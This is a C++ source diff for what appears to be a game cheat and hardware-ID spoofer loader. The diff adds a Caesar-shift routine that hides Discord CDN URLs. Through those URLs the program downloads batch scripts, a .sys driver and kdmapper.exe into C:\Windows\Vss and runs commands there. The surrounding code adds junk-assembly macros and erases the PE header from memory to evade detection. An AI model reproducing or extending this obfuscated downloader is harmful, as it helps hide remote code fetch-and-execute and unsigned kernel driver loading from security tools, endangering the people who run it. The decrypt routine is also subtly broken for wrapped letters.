@@ -22,6 +22,7 @@
 #include "Headers/lazy_importer.hpp"
 #include <conio.h>
 
+
 #define JUNK_CODE_ONE        \
     __asm{push eax}            \
     __asm{xor eax, eax}        \
@@ -37,7 +38,37 @@ using namespace junkcode;
 
 #define SHOW_DEBUG_MESSAGES
 
+string encrypt(string input) {
+    vector<char> word(input.begin(), input.end());
+    string alphabet = "abcdefghijklmnopqrstuvwxyz";
 
+    for (int i = 0; i < (int)input.length(); i++) {
+        for (int j = 0; j < (int)alphabet.length(); j++) {
+            if (word[i] == alphabet[j]) {
+                word[i] = alphabet[(j + 3) % 26];
+
+                break;
+            }
+        }
+    }
+    string str(word.begin(), word.end());
+    return str;
+}
+string decrypt(string input) {
+    vector<char> word(input.begin(), input.end());
+    string alphabet = "abcdefghijklmnopqrstuvwxyz";
+
+    for (int i = 0; i < (int)input.length(); i++) {
+        for (int j = 0; j < (int)alphabet.length(); j++) {
+            if (word[i] == alphabet[j]) {
+                word[i] = alphabet[(j - 3) % 26];
+                break;
+            }
+        }
+    }
+    string str(word.begin(), word.end());
+    return str;
+}
 VOID ErasePEHeaderFromMemory()
 {
     DWORD OldProtect = 0;
@@ -294,7 +325,7 @@ void apex()
 
     JUNK_CODE_ONE
         JUNK_CODE_ONE
-        std::string apex = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
+    std::string apex = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114575800954941/dsha.edw");
     std::string apexpath = (dead("C:\\Windows\\Vss\\Apex.bat").c_str());
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
     system(dead("cd C:\\Windows\\Vss\\").c_str());
@@ -320,7 +351,7 @@ void gta()
     tlmisir();
 
 
-    std::string gta = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
+    std::string gta = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114574483918858/jwd.edw");
     std::string gtapath = (dead("C:\\Windows\\Vss\\gta.bat").c_str());
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
     system(dead("cd C:\\Windows\\Vss\\").c_str());
@@ -345,7 +376,7 @@ void fortnite()
     tlmisir();
 
 
-    std::string fortnite = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
+    std::string fortnite = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114573007527946/Fruwqlwh.edw");
     std::string fortnitepath = (dead("C:\\Windows\\Vss\\Fortnite.bat").c_str());
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
     system(dead("cd C:\\Windows\\Vss\\").c_str());
@@ -368,7 +399,7 @@ void fishingplanet()
     lnttirs();
     tlmisir();
 
-    std::string fishingplanet = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
+    std::string fishingplanet = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114571648593931/ilvklqj-sodqhw.edw");
     std::string fishingplanetpath = (dead("C:\\Windows\\Vss\\Fishing-planet.bat").c_str());
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
     system(dead("cd C:\\Windows\Vss\\").c_str());
@@ -392,7 +423,7 @@ void cod()
     lnttirs();
     tlmisir();
 
-    std::string cod = (dead("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
+    std::string cod = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/880114570369318962/Crog-Wduh.edw");
     std::string codpath = (dead("C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
     system(dead("cd C:\\Windows\\Vss\\").c_str());
@@ -657,11 +688,11 @@ void spoofer()
 
 
 
-    string spoofer = (dead("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
+    string spoofer = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/881227464498630677/NhzWrri.vbv");
     string spooferpath = (dead("C:\\Windows\\Vss\\woof.sys").c_str());
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
 
-    string mapper = (dead("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
+    string mapper = decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/879745681294786600/ngpdsshu.hah");
     string mapperpath = (dead("C:\\Windows\\Vss\\mapper.exe").c_str());
     URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
     system(dead("cd C:\\Windows\\Vss\\").c_str());
